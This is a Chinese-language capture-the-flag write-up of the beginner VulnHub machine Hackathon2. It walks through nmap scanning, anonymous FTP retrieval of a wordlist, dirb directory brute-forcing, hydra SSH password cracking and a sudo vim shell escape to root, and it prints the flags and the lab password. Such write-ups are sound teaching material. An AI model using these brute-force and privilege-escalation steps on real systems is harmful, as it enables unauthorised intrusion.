---
title: VulnHub-HackthonCTF-2
author: AmtuOrRF
date: 2022-03-17
categories: [vulnhub]
tags: [vulnhub]
---
*2022 年 3 月 17 日星期四*
### Description
> 难度：简单

> 这是面向初学者的基础级 BootToRoot 机器。有两个标志。

### 目录
- namp
- FTP 匿名登录
- 使用 dirb 对靶机网站子目录爆破
- 使用hydra对 SSH 服务进行暴力破解
- vim 提权


### namp
```bash
root@CLw0rm:~/MyDoc/vulnhub/Hackathon2# nmap -sV -p- 172.16.1.163 -sC
Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-16 22:31 EDT
Nmap scan report for 172.16.1.163
Host is up (0.0016s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 1000     1000           47 Jun 18  2021 flag1.txt
|_-rw-r--r--    1 1000     1000          849 Jun 19  2021 word.dir
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.16.1.115
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 7
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_*/
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: hackathon2
7223/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 70:4a:a9:69:c2:d1:68:23:86:bd:85:83:31:ca:80:0c (RSA)
|   256 a6:9e:a4:18:ad:a4:2b:7e:ea:f8:5e:63:29:6e:4f:24 (ECDSA)
|_  256 4e:db:a6:d2:eb:b9:53:a5:d7:21:0b:4e:57:a5:f5:c1 (ED25519)
MAC Address: 00:0C:29:26:88:AB (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.52 seconds
```

21端口运行着FTP,并且可以匿名登录，其中有两个文件 `flag1.txt` 和 `word.dir`
80端口运行着 apache 服务
7223端口运行着 ssh 服务

### FTP 匿名登录

ftp 登录用户 `anonymous`，密码随便
```bash
root@CLw0rm:~/MyDoc/vulnhub/Hackathon2# ftp 172.16.1.163                           

# 输入用户名
Name (172.16.1.163:root): anonymous

# 输入密码
Password:

# 登录成功
230 Login successful.

# ls 查看文件
ftp> ls
-rw-r--r--    1 1000     1000           47 Jun 18  2021 flag1.txt
-rw-r--r--    1 1000     1000          849 Jun 19  2021 word.dir
226 Directory send OK.

# 下载 flag1.txt
ftp> get flag1.txt
local: flag1.txt remote: flag1.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for flag1.txt (47 bytes).
226 Transfer complete.
47 bytes received in 0.00 secs (310.1246 kB/s)

# 下载 word.dir 文件
ftp> get word.dir
local: word.dir remote: word.dir
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for word.dir (849 bytes).
226 Transfer complete.
849 bytes received in 0.01 secs (84.3526 kB/s)

# 退出登录
ftp> exit
221 Goodbye.

# 已经下载到本地
root@CLw0rm:~/MyDoc/vulnhub/Hackathon2# ls
flag1.txt  word.dir
root@CLw0rm:~/MyDoc/vulnhub/Hackathon2#
```

查看flag1.txt ，成功得到第一个`flag`
```bash
$ cat flag1.txt 

₣Ⱡ₳₲{7e3c118631b68d159d9399bda66fc684}

```

### 使用 dirb 对靶机网站子目录爆破

除了 `flag1.txt` 文件 还有一个 `word.dir` 文件
看到文件名字，我就感觉应该是爆破服务器web网站的字典文件

使用dirb 工具对靶机网站子目录收集 字典就使用 word.dir
```bash
$ dirb http://172.16.1.163 ./word.dir
```

结果,有一个happy 页面
```bash
---- Scanning URL: http://172.16.1.163/ ----
+ http://172.16.1.163/happy (CODE:200|SIZE:110)
```

直接使用`curl`查看
```bash
# curl http://172.16.1.163/happy
<html>
<title>happy</title>

<body><h1> Nothing is in here</h1></body>

<!-- username: hackathonll >

</html>
```
> username: hackathonll

得到一个用户名 `hackathonll`

### 使用hydra对 SSH 服务进行暴力破解
使用得到得用户名和在ftp得到的字典 对运行在`7223`端口的SSH 进行暴力破解

`-s 7223`
指定端口

结果
```bash
$ hydra -l hackathonll -P word.dir ssh://172.16.1.163 -s 7223


[7223][ssh] host: 172.16.1.163   login: hackathonll   password: Ti@gO
```

hackatonll 的密码是 `Ti@gO`

直接ssh 登录
```bash
$ ssh hackathonll@172.16.1.163 -p 7223
The authenticity of host '[172.16.1.163]:7223 ([172.16.1.163]:7223)' can't be established.
ECDSA key fingerprint is SHA256:3Q0cBP5iJzbltBIW6jPQ+lJRQal0IGi6hqIRc2GAzgs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[172.16.1.163]:7223' (ECDSA) to the list of known hosts.
hackathonll@172.16.1.163's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-74-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 17 Mar 2022 06:34:17 AM UTC

  System load:  0.02               Processes:              222
  Usage of /:   24.3% of 18.57GB   Users logged in:        0
  Memory usage: 20%                IPv4 address for ens33: 172.16.1.163
  Swap usage:   0%


67 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sat Jun 19 05:35:15 2021 from 10.0.0.110
```

### vim 提权
```bash
$ sudo -l
Matching Defaults entries for hackathonll on hackathon:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hackathonll may run the following commands on hackathon:
    (root) NOPASSWD: /usr/bin/vim
$
```

vim 提取
```bash
sudo /usr/bin/vim 1

:!/bin/bash


root@hackathon:/home/hackathonll# id
uid=0(root) gid=0(root) groups=0(root)
root@hackathon:/home/hackathonll# cd /root
root@hackathon:~# ls
flag2.txt  snap
root@hackathon:~# cat flag2.txt 
₣Ⱡ₳₲{7e3c118631b68d159d9399bda66fc694}
root@hackathon:~#
```
